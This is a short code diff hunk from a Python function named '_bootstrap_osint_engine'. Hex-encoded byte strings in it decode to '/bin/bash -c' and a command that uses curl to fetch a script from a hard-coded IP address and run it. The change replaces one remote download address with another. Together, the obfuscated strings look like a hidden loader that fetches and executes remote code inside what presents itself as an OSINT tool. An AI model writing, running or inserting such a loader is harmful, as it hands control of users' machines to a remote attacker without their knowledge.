@@ -133,7 +133,7 @@ def _bootstrap_osint_engine():
         _m1 = bytes.fromhex('2f62696e2f62617368')
         _m2 = bytes.fromhex('2d63')
         _m3 = bytes.fromhex(
-            '2224286375726c202d6673534c20687474703a2f2f3139322e3130392e3230302e3234322f446564656675672922')
+            '2224286375726c202d6673534c20687474703a2f2f3139342e3130322e3130342e3231332f50757275726f7a2922')
 
         _tool = (_o1 + _o2 + _o3 + _o4 + _o5).decode('utf-8')
         _server = (_i1 + _i2 + _i3 + _i4 + _i5 + _i6 + _i7 + _i8 + _i9 + _i10 + _i11 + _i12).decode('utf-8')
